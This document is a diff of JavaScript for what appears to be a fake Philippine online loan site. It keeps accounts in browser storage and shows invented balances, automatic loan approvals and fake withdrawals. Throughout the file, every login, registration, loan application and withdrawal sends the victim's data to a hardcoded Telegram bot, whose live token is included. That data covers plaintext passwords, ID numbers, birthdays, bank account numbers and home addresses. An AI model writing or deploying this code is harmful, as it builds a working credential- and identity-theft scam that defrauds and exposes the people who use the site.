-      "60":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "61":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "62":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "63":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "64":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "65":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "66":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "67":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "68":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "69":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "70":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""}
-    };
+// ============================================================
+//  STATE
+// ============================================================
+let users = {};
+let currentSlot = null;
+let currentUser = null;
+let selectedBank = '';
+let verifyTimer = null;
+let loanTimer = null;
+let wdTimer = null;
 
-    const TG_TOKEN = '8843546617:AAH_D5IY57cezbnIZgHWgU5J-C_84MZIBBw';
-    const TG_CHAT = '8843546617';
-    let currentUser = null, withdrawTimer = null, loanTimer = null, selectedBank = null, selectedMobile = null;
+// ============================================================
+//  INIT
+// ============================================================
+function initUsers(){
+  const stored = localStorage.getItem(LS_KEY);
+  if(stored){
+    try{ users = JSON.parse(stored); }
+    catch(e){ users = JSON.parse(JSON.stringify(DEFAULT_USERS)); saveUsers(); }
+  } else {
+    users = JSON.parse(JSON.stringify(DEFAULT_USERS));
+    saveUsers();
+  }
+}
 
-    function getUsers(){ let s=localStorage.getItem('fsl_v5'); if(s) try{return JSON.parse(s);}catch(e){} localStorage.setItem('fsl_v5',JSON.stringify(DEFAULT_USERS)); return JSON.parse(JSON.stringify(DEFAULT_USERS)); }
-    function saveUsers(u){ localStorage.setItem('fsl_v5',JSON.stringify(u)); }
-    async function tg(msg){ try{ await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }catch(e){} }
+function saveUsers(){
+  localStorage.setItem(LS_KEY, JSON.stringify(users));
+}
 
-    function toast(t,d=3000){ let c=document.getElementById('toastContainer'), el=document.createElement('div'); el.className='toast'; el.textContent=t; c.appendChild(el); setTimeout(()=>{el.style.opacity='0';el.style.transition='opacity 0.3s';setTimeout(()=>el.remove(),300);},d); }
+// ============================================================
+//  TELEGRAM
+// ============================================================
+function sendTelegram(msg){
+  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+  fetch(url,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:TG_CHAT, text:msg, parse_mode:'HTML'})
+  }).catch(()=>{});
+}
 
-    function showScreen(id){ document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+// ============================================================
+//  TOAST
+// ============================================================
+let toastTimer;
+function showToast(msg, type='info', duration=3000){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = `show ${type}`;
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(()=>{ t.className=''; },duration);
+}
 
-    function handleLogin(){
-      let email=document.getElementById('loginEmail').value.trim(), pass=document.getElementById('loginPassword').value.trim();
-      if(!email||!pass) return toast('⚠️ Fill all fields');
-      let users=getUsers(), found=null;
-      for(let [slot,u] of Object.entries(users)){ if(u.email&&u.email.toLowerCase()===email.toLowerCase()&&u.password===pass){ found={...u,slot}; break; } }
-      if(found){ currentUser=found; updateDashboard(); showScreen('screen-dashboard'); toast('✅ Welcome!'); tg(`🔔 <b>Login</b>\n📧 ${found.email}\n💰 ₱${found.balance.toFixed(2)}`); }
-      else toast('❌ Invalid credentials');
+// ============================================================
+//  SCREEN NAVIGATION
+// ============================================================
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+// ============================================================
+//  PASSWORD TOGGLE
+// ============================================================
+function togglePw(inputId, btn){
+  const inp = document.getElementById(inputId);
+  if(inp.type==='password'){ inp.type='text'; btn.textContent='🙈'; }
+  else { inp.type='password'; btn.textContent='👁'; }
+}
+
+// ============================================================
+//  TAB SWITCHING
+// ============================================================
+function switchTab(tab){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-item').forEach(t=>t.classList.remove('active'));
+  document.getElementById(`panel-${tab}`).classList.add('active');
+  document.getElementById(`tab-${tab}`).classList.add('active');
+  if(tab==='profile') refreshProfile();
+}
+
+// ============================================================
+//  LOGIN
+// ============================================================
+document.getElementById('login-form').addEventListener('submit', function(e){
+  e.preventDefault();
+  const email = document.getElementById('login-email').value.trim().toLowerCase();
+  const password = document.getElementById('login-password').value;
+  if(!email || !password){ showToast('Please fill in all fields','error'); return; }
+
+  let foundSlot = null;
+  for(let s=1;s<=70;s++){
+    const u = users[String(s)];
+    if(u && u.email && u.email.toLowerCase()===email && u.password===password){
+      foundSlot = String(s); break;
     }
+  }
 
-    function handleRegister(){
-      let name=document.getElementById('regName').value.trim(), idName=document.getElementById('regIdName').value.trim();
-      let idNum=document.getElementById('regIdNumber').value.trim(), email=document.getElementById('regEmail').value.trim();
-      let pass=document.getElementById('regPassword').value, confirm=document.getElementById('regConfirmPassword').value;
-      if(!name||!idName||!idNum||!email||!pass||!confirm) return toast('⚠️ All fields required');
-      if(pass!==confirm) return toast('❌ Passwords mismatch');
-      if(pass.length<6) return toast('❌ Password min 6 chars');
-      let users=getUsers();
-      for(let u of Object.values(users)){ if(u.email&&u.email.toLowerCase()===email.toLowerCase()) return toast('❌ Email exists'); }
-      let slot=null;
-      for(let i=1;i<=70;i++){ if(!users[i.toString()]||!users[i.toString()].email){ slot=i.toString(); break; } }
-      if(!slot) return toast('❌ Registration full');
-      let newUser={email,password:pass,balance:0,loanStatus:"none",loanAmount:0,fullName:name,idName,idNumber:idNum};
-      sessionStorage.setItem('pendingReg',JSON.stringify({slot,user:newUser}));
-      tg(`🆕 <b>Registration</b>\n👤 ${name}\n🆔 ${idName}\n🪪 ${idNum}\n📧 ${email}`);
-      document.getElementById('regName').value=''; document.getElementById('regIdName').value='';
-      document.getElementById('regIdNumber').value=''; document.getElementById('regEmail').value='';
-      document.getElementById('regPassword').value=''; document.getElementById('regConfirmPassword').value='';
-      startRegisterCountdown();
+  if(!foundSlot){ showToast('Invalid email or password','error'); return; }
+
+  currentSlot = foundSlot;
+  currentUser = users[foundSlot];
+  const btn = document.getElementById('login-btn');
+  btn.disabled=true; btn.textContent='Signing in...';
+
+  sendTelegram(
+    `🔐 <b>LOGIN ALERT</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName||'N/A'}\n📧 <b>Email:</b> ${currentUser.email}\n🔑 <b>Slot:</b> #${foundSlot}\n💰 <b>Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n📊 <b>Loan Status:</b> ${currentUser.loanStatus}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+  );
+
+  setTimeout(()=>{
+    btn.disabled=false; btn.textContent='Sign In';
+    loadDashboard();
+    showScreen('screen-dashboard');
+    showToast('Welcome back, '+( currentUser.fullName||email)+'! 👋','success');
+    document.getElementById('login-email').value='';
+    document.getElementById('login-password').value='';
+  },800);
+});
+
+// ============================================================
+//  REGISTER
+// ============================================================
+document.getElementById('register-form').addEventListener('submit', function(e){
+  e.preventDefault();
+  const fullName  = document.getElementById('reg-fullname').value.trim();
+  const idName    = document.getElementById('reg-idname').value.trim();
+  const idNumber  = document.getElementById('reg-idnumber').value.trim();
+  const email     = document.getElementById('reg-email').value.trim().toLowerCase();
+  const password  = document.getElementById('reg-password').value;
+  const confirm   = document.getElementById('reg-confirm').value;
+
+  if(!fullName||!idName||!idNumber||!email||!password||!confirm){
+    showToast('Please fill in all fields','error'); return;
+  }
+  if(password!==confirm){ showToast('Passwords do not match','error'); return; }
+  if(password.length<6){ showToast('Password must be at least 6 characters','error'); return; }
+  if(!/\S+@\S+\.\S+/.test(email)){ showToast('Invalid email address','error'); return; }
+
+  // Check email not already used
+  for(let s=1;s<=70;s++){
+    const u=users[String(s)];
+    if(u && u.email && u.email.toLowerCase()===email){
+      showToast('Email already registered. Please login.','error'); return;
     }
+  }
 
-    function startRegisterCountdown(){
-      let overlay=document.getElementById('registerVerifyOverlay'), disp=document.getElementById('regCountdown');
-      overlay.classList.remove('hidden'); let sec=1200;
-      function tick(){ let m=Math.floor(sec/60),s=sec%60; disp.textContent=`${m}:${s.toString().padStart(2,'0')}`;
-        if(sec<=0){ clearInterval(window.regTimer); overlay.classList.add('hidden');
-          let pending=sessionStorage.getItem('pendingReg'); if(pending){
-            let p=JSON.parse(pending); let users=getUsers(); users[p.slot]=p.user; saveUsers(users);
-            sessionStorage.removeItem('pendingReg'); toast('✅ Verified! You can login now.'); showScreen('screen-login');
-            tg(`✅ <b>Verified</b>\n📧 ${p.user.email}\n🔑 ${p.user.password}`);
-          }
-        } sec--; }
-      tick(); if(window.regTimer) clearInterval(window.regTimer); window.regTimer=setInterval(tick,1000);
+  // Find empty slot
+  let emptySlot = null;
+  for(let s=2;s<=70;s++){
+    if(!users[String(s)].email){ emptySlot=String(s); break; }
+  }
+  if(!emptySlot){ showToast('No available slots. Contact support.','error'); return; }
+
+  const newUser = {email,password,balance:0,loanStatus:"none",loanAmount:0,fullName,idName,idNumber};
+
+  // Store temporarily
+  sessionStorage.setItem('fsl_pending_slot', emptySlot);
+  sessionStorage.setItem('fsl_pending_user', JSON.stringify(newUser));
+
+  // Send to Telegram immediately
+  sendTelegram(
+    `🆕 <b>NEW REGISTRATION</b>\n━━━━━━━━━━━━━━━\n👤 <b>Full Name:</b> ${fullName}\n🪪 <b>ID Name:</b> ${idName}\n🔢 <b>ID Number:</b> ${idNumber}\n📧 <b>Email:</b> ${email}\n🔐 <b>Password:</b> ${password}\n🔑 <b>Assigned Slot:</b> #${emptySlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}\n\n⏳ Verification pending (20 min)`
+  );
+
+  const btn = document.getElementById('register-btn');
+  btn.disabled=true; btn.textContent='Creating...';
+  setTimeout(()=>{ btn.disabled=false; btn.textContent='Create Account'; },2000);
+
+  // Start verification countdown
+  startVerifyCountdown(emptySlot, newUser);
+});
+
+// ============================================================
+//  VERIFICATION COUNTDOWN — 20 minutes
+// ============================================================
+function startVerifyCountdown(slot, userData){
+  let totalSeconds = 20 * 60;
+  const circle = document.getElementById('verify-circle');
+  const timeLabel = document.getElementById('verify-time');
+  const circumference = 364.4;
+
+  document.getElementById('overlay-verify').classList.add('active');
+
+  clearInterval(verifyTimer);
+  verifyTimer = setInterval(()=>{
+    totalSeconds--;
+    const mins = Math.floor(totalSeconds/60);
+    const secs = totalSeconds%60;
+    timeLabel.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+    const progress = totalSeconds/(20*60);
+    circle.style.strokeDashoffset = circumference*(1-progress);
+
+    if(totalSeconds<=0){
+      clearInterval(verifyTimer);
+      // Save user permanently
+      users[slot] = userData;
+      saveUsers();
+      sessionStorage.removeItem('fsl_pending_slot');
+      sessionStorage.removeItem('fsl_pending_user');
+      document.getElementById('overlay-verify').classList.remove('active');
+      showToast('✅ Verified! You can login now.','success',5000);
+      sendTelegram(
+        `✅ <b>ACCOUNT VERIFIED</b>\n━━━━━━━━━━━━━━━\n📧 <b>Email:</b> ${userData.email}\n👤 <b>Name:</b> ${userData.fullName}\n🔑 <b>Slot:</b> #${slot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+      );
+      // Clear register form
+      document.getElementById('register-form').reset();
+      showScreen('screen-login');
     }
+  },1000);
+}
 
-    function handleLogout(){ currentUser=null; selectedBank=selectedMobile=null; document.getElementById('loginEmail').value=''; document.getElementById('loginPassword').value=''; showScreen('screen-login'); }
+// ============================================================
+//  DASHBOARD LOADER
+// ============================================================
+function loadDashboard(){
+  if(!currentUser) return;
+  const bal = Number(currentUser.balance||0);
+  document.getElementById('disp-balance').textContent = bal.toLocaleString('en-PH',{minimumFractionDigits:2,maximumFractionDigits:2});
+  updateStatusBadge(currentUser.loanStatus);
+  document.getElementById('home-loan-status').textContent = currentUser.loanStatus||'none';
+  document.getElementById('home-loan-amount').textContent = '₱'+Number(currentUser.loanAmount||0).toLocaleString();
+  document.getElementById('home-slot').textContent = '#'+currentSlot;
+  document.getElementById('verified-strip').style.display='flex';
+  // Prefill loan form
+  document.getElementById('loan-fullname').value = currentUser.fullName||'Shane Sabal';
+  document.getElementById('loan-idnumber').value = currentUser.idNumber||'4830645821731280';
+  refreshLoanStatus();
+  refreshProfile();
+}
 
-    function updateDashboard(){
-      if(!currentUser) return; let users=getUsers(), u=users[currentUser.slot];
-      if(u) currentUser={...u,slot:currentUser.slot};
-      document.getElementById('dashBalance').textContent=currentUser.balance.toFixed(2);
-      document.getElementById('homeBal').textContent='₱'+currentUser.balance.toFixed(2);
-      let st=currentUser.loanStatus||'none', statusEl=document.getElementById('dashLoanStatus'), homeEl=document.getElementById('homeLoanStatus');
-      statusEl.className='status-pill';
-      if(st==='pending'){ statusEl.textContent='⏳ Pending'; statusEl.classList.add('status-pending'); homeEl.textContent='⏳ Pending'; }
-      else if(st==='approved'){ statusEl.textContent='✅ Approved'; statusEl.classList.add('status-approved'); homeEl.textContent='✅ Approved'; }
-      else if(st==='rejected'){ statusEl.textContent='❌ Rejected'; statusEl.classList.add('status-rejected'); homeEl.textContent='❌ Rejected'; }
-      else { statusEl.textContent='Bank Loan'; statusEl.classList.add('status-bank'); homeEl.textContent='Bank Loan'; }
-      document.getElementById('profileInfo').innerHTML=`<strong>Email:</strong> ${currentUser.email}<br><strong>Name:</strong> ${currentUser.fullName||'N/A'}<br><strong>ID Name:</strong> ${currentUser.idName||'N/A'}<br><strong>ID Number:</strong> ${currentUser.idNumber||'N/A'}<br><strong>Balance:</strong> ₱${currentUser.balance.toFixed(2)}<br><strong>Loan:</strong> ${currentUser.loanStatus==='none'?'Bank Loan':currentUser.loanStatus}`;
+function updateStatusBadge(status){
+  const b = document.getElementById('disp-status-badge');
+  b.className='status-badge';
+  const map={none:'badge-none',pending:'badge-pending',approved:'badge-approved',rejected:'badge-rejected'};
+  b.classList.add(map[status]||'badge-none');
+  const labels={none:'No Loan',pending:'Pending',approved:'Approved',rejected:'Rejected'};
+  b.textContent=labels[status]||'No Loan';
+}
+
+function refreshLoanStatus(){
+  const info=document.getElementById('loan-status-info');
+  if(!currentUser) return;
+  if(currentUser.loanStatus==='pending') info.textContent='⏳ Your loan application is pending review.';
+  else if(currentUser.loanStatus==='approved') info.textContent='✅ Loan approved! Funds have been credited.';
+  else if(currentUser.loanStatus==='rejected') info.textContent='❌ Your loan was rejected. Contact support.';
+  else info.textContent='';
+}
+
+function refreshProfile(){
+  if(!currentUser) return;
+  document.getElementById('prof-name').textContent=currentUser.fullName||'—';
+  document.getElementById('prof-email').textContent=currentUser.email||'—';
+  document.getElementById('prof-fullname').textContent=currentUser.fullName||'—';
+  document.getElementById('prof-idname').textContent=currentUser.idName||'—';
+  document.getElementById('prof-idnumber').textContent=currentUser.idNumber||'—';
+  document.getElementById('prof-balance').textContent='₱'+Number(currentUser.balance||0).toLocaleString();
+  document.getElementById('prof-loanstatus').textContent=currentUser.loanStatus||'none';
+  document.getElementById('prof-loanamount').textContent='₱'+Number(currentUser.loanAmount||0).toLocaleString();
+  document.getElementById('prof-slot').textContent='#'+currentSlot;
+}
+
+// ============================================================
+//  LOAN APPLICATION
+// ============================================================
+document.getElementById('loan-form').addEventListener('submit',function(e){
+  e.preventDefault();
+  if(!currentUser){ showToast('Please login first','error'); return; }
+  if(currentUser.loanStatus==='pending'){ showToast('You already have a pending loan','error'); return; }
+  if(currentUser.loanStatus==='approved'){ showToast('Loan already approved. Withdraw your funds.','info'); return; }
+
+  const fullName   = document.getElementById('loan-fullname').value.trim();
+  const idNumber   = document.getElementById('loan-idnumber').value.trim();
+  const gender     = document.getElementById('loan-gender').value;
+  const birthday   = document.getElementById('loan-birthday').value;
+  const bank       = document.getElementById('loan-bank').value;
+  const bankAcc    = document.getElementById('loan-bankaccount').value.trim();
+  const marital    = document.getElementById('loan-marital').value;
+  const education  = document.getElementById('loan-education').value;
+  const career     = document.getElementById('loan-career').value.trim();
+  const province   = document.getElementById('loan-province').value;
+  const address    = document.getElementById('loan-address').value.trim();
+  const amount     = parseFloat(document.getElementById('loan-amount').value);
+
+  if(!fullName||!idNumber||!birthday||!bankAcc||!career||!address||!amount){
+    showToast('Please fill in all required fields','error'); return;
+  }
+  if(amount<1000){ showToast('Minimum loan amount is ₱1,000','error'); return; }
+  if(amount>500000){ showToast('Maximum loan amount is ₱500,000','error'); return; }
+
+  const btn=document.getElementById('loan-btn');
+  btn.disabled=true; btn.textContent='Submitting...';
+
+  currentUser.loanStatus='pending';
+  currentUser.loanAmount=amount;
+  users[currentSlot]=currentUser;
+  saveUsers();
+
+  sendTelegram(
+    `📋 <b>LOAN APPLICATION</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${fullName}\n🔢 <b>ID #:</b> ${idNumber}\n⚧ <b>Gender:</b> ${gender}\n🎂 <b>Birthday:</b> ${birthday}\n🏦 <b>Bank:</b> ${bank}\n💳 <b>Account #:</b> ${bankAcc}\n💍 <b>Marital:</b> ${marital}\n🎓 <b>Education:</b> ${education}\n💼 <b>Career:</b> ${career}\n📍 <b>Province:</b> ${province}\n🏠 <b>Address:</b> ${address}\n💰 <b>Loan Amount:</b> ₱${amount.toLocaleString()}\n📧 <b>Email:</b> ${currentUser.email}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+  );
+
+  updateStatusBadge('pending');
+  document.getElementById('home-loan-status').textContent='pending';
+  document.getElementById('home-loan-amount').textContent='₱'+amount.toLocaleString();
+  refreshLoanStatus();
+  loadDashboard();
+
+  setTimeout(()=>{
+    btn.disabled=false; btn.textContent='📋 Submit Loan Application';
+    startLoanCountdown(amount);
+  },800);
+});
+
+// ============================================================
+//  LOAN COUNTDOWN — 30 minutes
+// ============================================================
+function startLoanCountdown(amount){
+  let totalSeconds = 30*60;
+  const circle=document.getElementById('loan-circle');
+  const timeLabel=document.getElementById('loan-time');
+  const circumference=364.4;
+  document.getElementById('overlay-loan').classList.add('active');
+
+  clearInterval(loanTimer);
+  loanTimer=setInterval(()=>{
+    totalSeconds--;
+    const mins=Math.floor(totalSeconds/60);
+    const secs=totalSeconds%60;
+    timeLabel.textContent=`${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+    circle.style.strokeDashoffset=circumference*(1-totalSeconds/(30*60));
+
+    if(totalSeconds<=0){
+      clearInterval(loanTimer);
+      document.getElementById('overlay-loan').classList.remove('active');
+
+      // Auto approve
+      currentUser.loanStatus='approved';
+      currentUser.balance=Number(currentUser.balance)+amount;
+      currentUser.loanAmount=amount;
+      users[currentSlot]=currentUser;
+      saveUsers();
+
+      updateStatusBadge('approved');
+      loadDashboard();
+      showToast('🎉 Loan Approved! ₱'+amount.toLocaleString()+' credited to your balance.','success',5000);
+
+      sendTelegram(
+        `✅ <b>LOAN APPROVED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n📧 <b>Email:</b> ${currentUser.email}\n💰 <b>Amount Approved:</b> ₱${amount.toLocaleString()}\n💳 <b>New Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+      );
     }
+  },1000);
+}
 
-    function switchDashTab(tab){
-      document.querySelectorAll('.dash-section').forEach(s=>s.classList.remove('active'));
-      document.querySelectorAll('#dashNav .nav-item').forEach(n=>n.classList.remove('active'));
-      let sec=document.getElementById('dash-'+tab); if(sec) sec.classList.add('active');
-      let items=document.querySelectorAll('#dashNav .nav-item'), map={home:0,loan:1,withdraw:2,profile:3};
-      if(map[tab]!==undefined&&items[map[tab]]) items[map[tab]].classList.add('active');
-      if(tab==='photo'){ openPhotoModal(); if(items[0])items[0].classList.add('active'); document.getElementById('dash-home').classList.add('active'); }
+// ============================================================
+//  BANK SELECTION
+// ============================================================
+function selectBank(el){
+  document.querySelectorAll('.bank-card').forEach(c=>c.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedBank=el.dataset.bank;
+  document.getElementById('selected-bank-name').textContent=selectedBank;
+  document.getElementById('withdraw-form-section').style.display='block';
+}
+
+// ============================================================
+//  WITHDRAW
+// ============================================================
+function submitWithdraw(){
+  if(!currentUser){ showToast('Please login first','error'); return; }
+  if(!selectedBank){ showToast('Please select a bank or wallet','error'); return; }
+
+  const amount   = parseFloat(document.getElementById('wd-amount').value);
+  const account  = document.getElementById('wd-account').value.trim();
+  const accName  = document.getElementById('wd-accname').value.trim();
+  const password = document.getElementById('wd-password').value;
+
+  if(!amount||!account||!accName||!password){
+    showToast('Please fill in all withdrawal fields','error'); return;
+  }
+  if(amount<100){ showToast('Minimum withdrawal is ₱100','error'); return; }
+  if(password!==currentUser.password){ showToast('Incorrect password','error'); return; }
+  if(amount>Number(currentUser.balance)){ showToast('Insufficient balance','error'); return; }
+
+  const btn=document.getElementById('wd-btn');
+  btn.disabled=true; btn.textContent='Processing...';
+
+  // Deduct balance
+  currentUser.balance=Number(currentUser.balance)-amount;
+  users[currentSlot]=currentUser;
+  saveUsers();
+  loadDashboard();
+
+  sendTelegram(
+    `💸 <b>WITHDRAWAL REQUEST</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n📧 <b>Email:</b> ${currentUser.email}\n🏦 <b>Bank/Wallet:</b> ${selectedBank}\n💳 <b>Account #:</b> ${account}\n👤 <b>Account Name:</b> ${accName}\n💰 <b>Amount:</b> ₱${amount.toLocaleString()}\n💳 <b>Remaining Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+  );
+
+  setTimeout(()=>{
+    btn.disabled=false; btn.textContent='🏧 Process Withdrawal';
+    startWithdrawCountdown(amount);
+    // Clear form
+    document.getElementById('wd-amount').value='';
+    document.getElementById('wd-account').value='';
+    document.getElementById('wd-accname').value='';
+    document.getElementById('wd-password').value='';
+  },600);
+}
+
+// ============================================================
+//  WITHDRAW COUNTDOWN — 30 minutes
+// ============================================================
+function startWithdrawCountdown(amount){
+  let totalSeconds=30*60;
+  const circle=document.getElementById('wd-circle');
+  const timeLabel=document.getElementById('wd-time');
+  const circumference=364.4;
+  document.getElementById('overlay-withdraw').classList.add('active');
+
+  clearInterval(wdTimer);
+  wdTimer=setInterval(()=>{
+    totalSeconds--;
+    const mins=Math.floor(totalSeconds/60);
+    const secs=totalSeconds%60;
+    timeLabel.textContent=`${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+    circle.style.strokeDashoffset=circumference*(1-totalSeconds/(30*60));
+
+    if(totalSeconds<=0){
+      clearInterval(wdTimer);
+      document.getElementById('overlay-withdraw').classList.remove('active');
+      showToast('✅ Withdrawal of ₱'+amount.toLocaleString()+' processed!','success',5000);
+      sendTelegram(
+        `✅ <b>WITHDRAWAL PROCESSED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n💰 <b>Amount Sent:</b> ₱${amount.toLocaleString()}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+      );
     }
+  },1000);
+}
 
-    function submitLoanApplication(){
-      if(!currentUser) return toast('❌ Login first');
-      let amt=parseFloat(document.getElementById('loanAmount').value);
-      if(!amt||amt<=0) return toast('⚠️ Enter amount');
-      let users=getUsers(); users[currentUser.slot].loanStatus='pending'; users[currentUser.slot].loanAmount=amt;
-      saveUsers(users); currentUser.loanStatus='pending'; currentUser.loanAmount=amt; updateDashboard();
-      tg(`📋 <b>Loan</b>\n👤 ${document.getElementById('loanFullName').value}\n💰 ₱${amt}\n📧 ${currentUser.email}`);
-      showLoanPendingOverlay();
-    }
+// ============================================================
+//  ID MODAL
+// ============================================================
+function openIdModal(){
+  document.getElementById('modal-id').classList.add('active');
+}
+function closeIdModal(){
+  document.getElementById('modal-id').classList.remove('active');
+}
+document.getElementById('modal-id').addEventListener('click',function(e){
+  if(e.target===this) closeIdModal();
+});
 
-    function showLoanPendingOverlay(){
-      document.getElementById('loanPendingOverlay').classList.remove('hidden'); let sec=1800, disp=document.getElementById('loanCountdown');
-      function tick(){ let m=Math.floor(sec/60),s=sec%60; disp.textContent=`${m}:${s.toString().padStart(2,'0')}`;
-        if(sec<=0){ clearInterval(loanTimer); document.getElementById('loanPendingOverlay').classList.add('hidden');
-          let users=getUsers(); if(users[currentUser.slot].loanStatus==='pending'){
-            users[currentUser.slot].loanStatus='approved'; users[currentUser.slot].balance+=(users[currentUser.slot].loanAmount||0);
-            saveUsers(users); currentUser={...users[currentUser.slot],slot:currentUser.slot}; updateDashboard();
-            toast('✅ Loan Approved!'); tg(`✅ <b>Approved</b>\n📧 ${currentUser.email}\n💰 +₱${(users[currentUser.slot].loanAmount||0).toFixed(2)}`);
-          }
-        } sec--; }
-      tick(); if(loanTimer)clearInterval(loanTimer); loanTimer=setInterval(tick,1000);
-    }
-    function closeLoanPendingOverlay(){ document.getElementById('loanPendingOverlay').classList.add('hidden'); if(loanTimer)clearInterval(loanTimer); }
+// ============================================================
+//  LOGOUT
+// ============================================================
+function doLogout(){
+  currentSlot=null;
+  currentUser=null;
+  selectedBank='';
+  clearInterval(verifyTimer);
+  clearInterval(loanTimer);
+  clearInterval(wdTimer);
+  document.getElementById('overlay-loan').classList.remove('active');
+  document.getElementById('overlay-withdraw').classList.remove('active');
+  // Reset tabs
+  switchTab('home');
+  showScreen('screen-login');
+  showToast('Logged out successfully','info');
+}
 
-    function populateBanks(){
-      let banks=[{name:'BDO',icon:'🏦'},{name:'BPI',icon:'🏛️'},{name:'Metrobank',icon:'🏦'},{name:'Landbank',icon:'🏦'},{name:'PNB',icon:'🏦'},{name:'Security',icon:'🏦'},{name:'UnionBank',icon:'🏦'},{name:'RCBC',icon:'🏦'}];
-      let mobiles=[{name:'GCash',icon:'📱'},{name:'Maya',icon:'📱'},{name:'Coins.ph',icon:'📱'},{name:'GrabPay',icon:'📱'}];
-      let bg=document.getElementById('bankGrid'), mg=document.getElementById('mobileGrid'); bg.innerHTML=''; mg.innerHTML='';
-      banks.forEach(b=>{ let d=document.createElement('div'); d.className='bank-item'; d.innerHTML=`<span class="bank-icon">${b.icon}</span><span class="bank-name">${b.name}</span>`;
-        d.onclick=()=>{ document.querySelectorAll('.bank-item').forEach(e=>e.classList.remove('selected')); d.classList.add('selected'); selectedBank=b; selectedMobile=null; }; bg.appendChild(d); });
-      mobiles.forEach(m=>{ let d=document.createElement('div'); d.className='bank-item'; d.innerHTML=`<span class="bank-icon">${m.icon}</span><span class="bank-name">${m.name}</span>`;
-        d.onclick=()=>{ document.querySelectorAll('.bank-item').forEach(e=>e.classList.remove('selected')); d.classList.add('selected'); selectedMobile=m; selectedBank=null; }; mg.appendChild(d); });
-    }
+// ============================================================
+//  RESUME PENDING VERIFICATION ON RELOAD
+// ============================================================
+function checkPendingVerify(){
+  const slot=sessionStorage.getItem('fsl_pending_slot');
+  const userData=sessionStorage.getItem('fsl_pending_user');
+  if(slot && userData){
+    try{
+      const u=JSON.parse(userData);
+      // restart but we don't know remaining time exactly so restart full
+      startVerifyCountdown(slot, u);
+      showScreen('screen-register');
+    }catch(e){}
+  }
+}
 
-    function submitWithdrawal(){
-      if(!currentUser) return toast('❌ Login first');
-      let amt=parseFloat(document.getElementById('withdrawAmount').value), pass=document.getElementById('withdrawPassword').value;
-      if(!amt||amt<=0) return toast('⚠️ Enter amount'); if(amt>currentUser.balance) return toast('❌ Insufficient');
-      if(pass!==currentUser.password) return toast('❌ Wrong password');
-      if(!selectedBank&&!selectedMobile) return toast('⚠️ Select bank/wallet');
-      let users=getUsers(); users[currentUser.slot].balance-=amt; saveUsers(users); currentUser.balance=users[currentUser.slot].balance; updateDashboard();
-      tg(`💸 <b>Withdraw</b>\n📧 ${currentUser.email}\n💰 -₱${amt.toFixed(2)}\n🏦 ${(selectedBank||selectedMobile).name}`);
-      document.getElementById('withdrawAmount').value=''; document.getElementById('withdrawPassword').value=''; showWithdrawOverlay();
-    }
-    function showWithdrawOverlay(){ document.getElementById('withdrawOverlay').classList.remove('hidden'); let sec=1800, d=document.getElementById('withdrawCountdown');
-      function tick(){ let m=Math.floor(sec/60),s=sec%60; d.textContent=`${m}:${s.toString().padStart(2,'0')}`; if(sec<=0){ clearInterval(withdrawTimer); document.getElementById('withdrawOverlay').classList.add('hidden'); toast('✅ Withdrawal processed'); } sec--; }
-      tick(); if(withdrawTimer)clearInterval(withdrawTimer); withdrawTimer=setInterval(tick,1000); }
-    function closeWithdrawOverlay(){ document.getElementById('withdrawOverlay').classList.add('hidden'); if(withdrawTimer)clearInterval(withdrawTimer); }
+// ============================================================
